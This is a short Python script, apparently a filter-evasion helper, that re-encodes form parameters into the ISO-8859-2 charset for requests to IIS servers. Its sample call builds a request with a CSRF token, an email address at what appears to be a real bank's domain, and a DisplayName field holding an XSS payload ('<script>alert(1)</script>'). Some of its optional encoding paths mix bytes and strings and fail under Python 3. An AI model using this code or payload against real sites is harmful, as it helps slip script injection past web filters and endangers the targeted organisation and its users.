import urllib
from urllib import parse

def paramEncode(params="", charset="ISO-8859-2", encodeEqualSign=False, encodeAmpersand=False, urldecodeInput=True, urlencodeOutput=True):
    result = ""
    equalSign = "="
    ampersand = "&"
    if encodeEqualSign:
       equalSign = equalSign.encode(charset)
    if encodeAmpersand:
       ampersand = ampersand.encode(charset)
    params_list = params.split("&")
    for param_pair in params_list:
       param, value = param_pair.split("=")
       if urldecodeInput:
          param = urllib.parse.unquote(param) #.decode('utf8')
          value = urllib.parse.unquote(value) #.decode('utf8')
       param = param.encode(charset)
       value = value.encode(charset)
       if urlencodeOutput:
          param = urllib.parse.quote_plus(param)
          value = urllib.parse.quote_plus(value)
       if result:
          result += ampersand
       result += param + equalSign + value
    return result

# for IIS
print (paramEncode(r"__RequestVerificationToken=30VyaXTvwdHHZZotZxXj1xXPm--cxDKOWknuleojmcmjJvrTvlGgjV544EvyE41v9L021QqZvVxhRTl9dvJECqa5Rdd_WqeFkLVLz3L04OkiUaz3nI3SdN66MpmNPgu4aD28FpdP1HauJp9PsYOnYg2&Email=Podrskaproizvodima.MaloprodajePPM%40unicreditgroup.ba&DisplayName=podrska_korisnicima<script>alert(1)</script>"))
